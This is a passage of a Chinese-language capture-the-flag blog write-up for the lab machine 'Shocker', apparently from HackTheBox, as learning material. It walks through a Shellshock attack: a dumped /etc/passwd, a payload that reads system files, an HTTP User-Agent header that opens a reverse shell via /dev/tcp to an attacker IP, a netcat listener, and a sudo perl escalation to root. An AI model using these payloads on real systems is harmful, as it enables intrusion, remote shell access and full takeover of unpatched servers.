+</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sync</span>
+</span></span><span class="line"><span class="cl"><span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span> <span class="n">List</span> <span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">gnats</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="n">Gnats</span> <span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span> <span class="n">System</span> <span class="p">(</span><span class="n">admin</span><span class="p">):</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Time</span> <span class="n">Synchronization</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+</span></span><span class="line"><span class="cl"><span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Network</span> <span class="n">Management</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">netif</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+</span></span><span class="line"><span class="cl"><span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Resolver</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">resolve</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+</span></span><span class="line"><span class="cl"><span class="n">systemd</span><span class="o">-</span><span class="n">bus</span><span class="o">-</span><span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Bus</span> <span class="n">Proxy</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+</span></span><span class="line"><span class="cl"><span class="n">syslog</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">108</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">syslog</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+</span></span><span class="line"><span class="cl"><span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+</span></span><span class="line"><span class="cl"><span class="n">lxd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">lxd</span><span class="o">/</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+</span></span><span class="line"><span class="cl"><span class="n">messagebus</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">107</span><span class="p">:</span><span class="mi">111</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">dbus</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+</span></span><span class="line"><span class="cl"><span class="n">uuidd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">108</span><span class="p">:</span><span class="mi">112</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">uuidd</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+</span></span><span class="line"><span class="cl"><span class="n">dnsmasq</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">109</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">dnsmasq</span><span class="p">,,,:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">misc</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+</span></span><span class="line"><span class="cl"><span class="n">sshd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">110</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">shelly</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">shelly</span><span class="p">,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">shelly</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>OK,payload为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">() { :; }; echo; /bin/cat /etc/passwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="该bash使用的环境变量是通过函数名称来调用的导致漏洞出问题是以开头定义的环境变量在命令env中解析成函数后bash执行并未退出而是继续解析并执行shell命令而其核心的原因在于在输入的过滤中没有严格限制边界也没有做出合法化的参数判断">该<code>Bash</code>使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>(){</code>开头定义的环境变量在命令<code>ENV</code>中解析成函数后，<code>Bash</code>执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</h3>
+<h3 id="将payload插入user-agentcookie等请求头中发送请求发现服务端已经将payload作为bash命令执行了下一步我想到的是反弹目标的shell到msf上">将payload插入user-agent，cookie等请求头中，发送请求，发现服务端已经将payload作为bash命令执行了。下一步，我想到的是反弹目标的shell到msf上。</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /cgi-bin/user.sh HTTP/1.1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host: 10.129.85.4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User-Agent: () { :; }; echo;/bin/sh -i &gt;&amp; /dev/tcp/10.10.16.9/1234 0&gt;&amp;1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Content-Length: 299
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Pragma: no-cache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Cache-Control: no-cache
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -nlvp 1234
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">pwd</span>   
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span> <span class="n">cd</span> <span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span> <span class="n">ls</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">boot</span>
+</span></span><span class="line"><span class="cl"><span class="n">dev</span>
+</span></span><span class="line"><span class="cl"><span class="n">etc</span>
+</span></span><span class="line"><span class="cl"><span class="n">home</span>
+</span></span><span class="line"><span class="cl"><span class="n">initrd</span><span class="o">.</span><span class="n">img</span>
+</span></span><span class="line"><span class="cl"><span class="n">lib</span>
+</span></span><span class="line"><span class="cl"><span class="n">lib64</span>
+</span></span><span class="line"><span class="cl"><span class="n">lost</span><span class="o">+</span><span class="n">found</span>
+</span></span><span class="line"><span class="cl"><span class="n">media</span>
+</span></span><span class="line"><span class="cl"><span class="n">mnt</span>
+</span></span><span class="line"><span class="cl"><span class="n">opt</span>
+</span></span><span class="line"><span class="cl"><span class="n">proc</span>
+</span></span><span class="line"><span class="cl"><span class="n">root</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span>
+</span></span><span class="line"><span class="cl"><span class="n">sbin</span>
+</span></span><span class="line"><span class="cl"><span class="n">snap</span>
+</span></span><span class="line"><span class="cl"><span class="n">srv</span>
+</span></span><span class="line"><span class="cl"><span class="n">sys</span>
+</span></span><span class="line"><span class="cl"><span class="n">tmp</span>
+</span></span><span class="line"><span class="cl"><span class="n">usr</span>
+</span></span><span class="line"><span class="cl"><span class="k">var</span>
+</span></span><span class="line"><span class="cl"><span class="n">vmlinuz</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span> <span class="n">cd</span> <span class="n">home</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span> <span class="n">ls</span>
+</span></span><span class="line"><span class="cl"><span class="n">shelly</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span> <span class="n">cd</span> <span class="n">shelly</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span> <span class="n">pwd</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">shelly</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span> <span class="n">ls</span>
+</span></span><span class="line"><span class="cl"><span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="mi">30805</span><span class="n">fc5d34502c55ba370c803bd5628</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>到此，拿下shelly用户的flag。尝试进一步提权到root</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">sudo perl -e &#39;exec &#34;/bin/bash&#34;;&#39;
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">cd /root
+</span></span><span class="line"><span class="cl">cat root.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-07</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/shocker/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/shocker/" data-title="shocker" data-via="xxxx"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/shocker/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/shocker/" data-title="shocker"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/shocker/" data-title="shocker"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/shocker/" data-title="shocker"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/sosimple/" class="prev" rel="prev" title="SoSimple"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>SoSimple</a>
+            <a href="/sense/" class="next" rel="next" title="SENSE">SENSE<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
